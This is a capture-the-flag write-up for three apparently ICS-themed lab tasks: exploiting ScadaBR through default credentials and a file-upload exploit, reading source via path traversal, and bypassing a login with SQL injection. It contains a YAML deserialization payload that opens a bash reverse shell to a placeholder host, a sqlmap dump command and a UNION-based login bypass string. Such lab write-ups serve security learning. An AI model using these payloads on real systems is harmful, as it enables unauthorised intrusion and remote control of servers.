### Task 10: Web
+ Scan port <IP> : 
22,80,5901,8080
```
8080/tcp open  http    syn-ack ttl 62 Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: ScadaBR CTF
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
```
+ Access port 8080 --> ScadaBR 
+ Login default credential "admin:admin"
```
searchsploit ScadaBR 
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (1)              | windows/webapps/49734.py
ScadaBR 1.0 - Arbitrary File Upload (Authenticated) (2)              | linux/webapps/49735.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
``` 

+ Download file python (2) --> Run and get the shell 
+ Flag in /var/lib/tomcat7/root.txt
--> Get flag `THM{rce_archieved_through_script_injection}`

### Task 11:
+ Access port 8080 --> We find the feature /log/view has the vuln "File Path Traversal".
![alt text](image.png)

+ With Path Traversal we can read sensitive file "opt/hmi/update.py" and "opt/hmi/app.py"
+ We've known website is build by Python and run Nginx server.
+ Read `app.py` --> We found that we can use the `/config/update` endpoint to upload a malicious YAML configuration that may lead to RCE.
```
@app.route('/config/update', methods=['GET','POST'])
def config_update():
    if request.method == 'POST':
        sig = request.headers.get('X-FTW','')
        if sig != app_config['SIGNATURE']:
            return 'Forbidden', 403
        if request.content_type != 'application/x-yaml':
            return 'Unsupported Media Type', 415
        data = request.data
        with open(os.path.join(APP_ROOT, 'config.yaml'), 'wb') as f:
            f.write(data)
        log('Configuration updated', 'app')
        subprocess.Popen(['sudo', 'python3', os.path.join(APP_ROOT, 'update.py')])
        return 'Configuration applied', 200
    return render_template('update.html')
```

+ Read `update.py` :
```python
# /opt/hmi/update.py
#!/usr/bin/env python3
import os
import time
import yaml

LOG = '/opt/hmi/logs/loader.log'

def log(msg):
    ts = time.strftime('%Y-%m-%dT%H:%M:%S')
    with open(LOG, 'a') as f:
        f.write(f"{ts} {msg}\n")

log('Config loader started')

try:
    cfg = yaml.load(open('/opt/hmi/config.yaml','r'), Loader=yaml.UnsafeLoader)
    log(f"Applying config: {cfg}")
    time.sleep(1)
    log('Config applied successfully')
except Exception as e:
    log(f"Error applying config: {e}")
```
--> The vuln in the func `yaml.load()` to input untrusted data and `yaml.UnsafeLoader` load untrusted data --> spawn the shell.
+ Create Yaml Payload:

```bash
dummy: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/IP_Machine/Port_machine 0>&1 &'"]
PLCS:
  - id: PLC-101
    ip: 192.168.10.11
  - id: PLC-102
    ip: 192.168.10.12
SENSORS:
  - name: FlowRate
    unit: L/s
  - name: Pressure
    unit: bar
SIGNATURE: "secr3tFTW192d2390"
```
+ Note: We read file /opt/hmi/config.yaml to get the `PLCS` and `SIGNATURE` .

+ Upload payload to /config/update, we need to modify the Headers `Content-Type` and add `X-FTW` to verify payload.
+ Open netcat to capture the shell:

![alt text](image-1.png)
--> Get the flag.

### Task 35:
+ Scan ports we have port 80 and 22.
+ Access port 80 --> Page login 
+ Try test SQLi with param `username` --> Get the error SQL

![alt text](image-2.png)

+ Using SQL map to exploit
```
sqlmap -r ~/Documents/request.txt --dbms=mysql -p username --level=4 --risk=3 --dump --threads=10
```
We dump credential:

![alt text](image-3.png)

![alt text](image-4.png)

+ We didn't have to crack the hash, we had to use the SQL injection and UNION a fake user. We back to the page login, we could do 
`username='UNION SELECT 1,admin,[any sha256 hash]` and then pass the original unhashed `password` which chose in the password field.
--> Login successfull and get the Flag.